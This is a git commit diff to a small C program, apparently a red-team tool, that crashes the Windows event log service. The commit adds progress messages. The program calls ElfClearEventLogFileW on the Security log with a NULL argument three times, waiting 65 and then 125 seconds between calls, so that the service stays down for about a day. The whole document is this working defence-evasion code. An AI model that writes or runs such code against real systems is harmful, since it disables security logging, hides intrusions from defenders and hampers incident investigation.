93130fd6cdaa8bf6a7ba4bad8594407f05e98858
Benjamin Lim <mail@limbenjamin.com>
2020-10-16 18:27:33 +0800

    Improved Description

--- LogServiceCrash/LogServiceCrash.c
+++ LogServiceCrash/LogServiceCrash.c
@@ -11,20 +11,28 @@ char* VERSION_NO = "1.0";
 
 int main()
 {
-	HANDLE eventlog = NULL;
+	printf("Starting log service crasher...\n");
 
+	HANDLE eventlog = NULL;
+	
 	eventlog = OpenEventLogA(NULL, "Security");
 	ElfClearEventLogFileW(eventlog, NULL);
+
+	printf("First crash done. Waiting 65 seconds for service to restart itself...\n");
 
 	Sleep(65000);
 
 	eventlog = OpenEventLogA(NULL, "Security");
 	ElfClearEventLogFileW(eventlog, NULL);
 
+	printf("Second crash done. Waiting 125 seconds for service to restart itself...\n");
+
 	Sleep(125000);
 
 	eventlog = OpenEventLogA(NULL, "Security");
 	ElfClearEventLogFileW(eventlog, NULL);
+
+	printf("Third crash done. Log service should be restarted 1 day later.\n");
 
     return 0;
 }
